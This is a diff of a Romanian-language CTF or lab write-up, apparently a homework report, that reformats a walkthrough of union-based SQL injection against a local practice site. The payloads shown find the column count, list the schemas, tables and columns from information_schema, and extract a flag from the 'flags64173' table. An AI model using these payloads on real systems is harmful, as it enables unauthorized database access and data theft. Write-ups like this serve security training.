@@ -34,17 +34,20 @@ observa ca vulnerabilitatea este la adresa `http://localhost:8080/inside/p/`
 - se incearca aflarea nr de coloane printr un payload care primeste ca arg nr coloanei
 pentru a vedea la ce index apare eroarea (ex: ' order by X -- ;)
 - se trimit mai multe atacuri pentru a afla informatia pas cu pas:
-1. se observa ca se afiseaza informatia la userul 3 si apar duplicate => distinct
-' union select distinct 1, 2, group_concat(distinct(table_schema)), 4, 5, 6, 7, 8
-from information_schema.tables -- ;
+1 se observa ca se afiseaza informatia la userul 3 si apar duplicate => distinct
+`' union select distinct 1, 2, group_concat(distinct(table_schema)), 4, 5, 6, 7, 8
+from information_schema.tables -- ;`
   observam web_270
-2. ' union select distinct 1, 2, group_concat(table_name), 4, 5, 6, 7, 8 from 
-information_schema.tables where table_schema='web_270' -- ;
+
+1 `' union select distinct 1, 2, group_concat(table_name), 4, 5, 6, 7, 8 from 
+information_schema.tables where table_schema='web_270' -- ;`
   observam flags64173
-3.' union select 1, 2, group_concat(column_name), 4, 5, 6, 7, 8
-from information_schema.columns where table_schema='web_270' and table_name='flags64173' -- ;
+
+1 `' union select 1, 2, group_concat(column_name), 4, 5, 6, 7, 8
+from information_schema.columns where table_schema='web_270' and table_name='flags64173' -- ;`
   observam zaflag
-4.' union select 1, 2, zaflag, 4, 5, 6, 7, 8 from flags64173 -- ;
+  
+1 `' union select 1, 2, zaflag, 4, 5, 6, 7, 8 from flags64173 -- ;`
   observam flag ul
 
 ### Task5
